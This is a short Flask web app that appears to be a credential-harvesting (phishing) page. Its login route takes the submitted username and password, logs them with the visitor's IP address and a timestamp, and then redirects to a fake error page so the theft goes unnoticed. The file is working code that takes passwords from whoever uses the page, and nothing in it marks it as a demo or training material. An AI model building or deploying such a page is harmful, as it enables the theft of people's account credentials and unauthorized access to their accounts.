from flask import Flask, render_template, request, redirect
from utils.logger import log_credentials
from datetime import datetime
import os

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        ip = request.remote_addr
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_credentials(username, password, ip, timestamp)
        return redirect("/error")
    return render_template("login.html")

@app.route("/error")
def error():
    return render_template("error.html")

if __name__ == "__main__":
    os.makedirs("app/logs", exist_ok=True)
    app.run(debug=True)
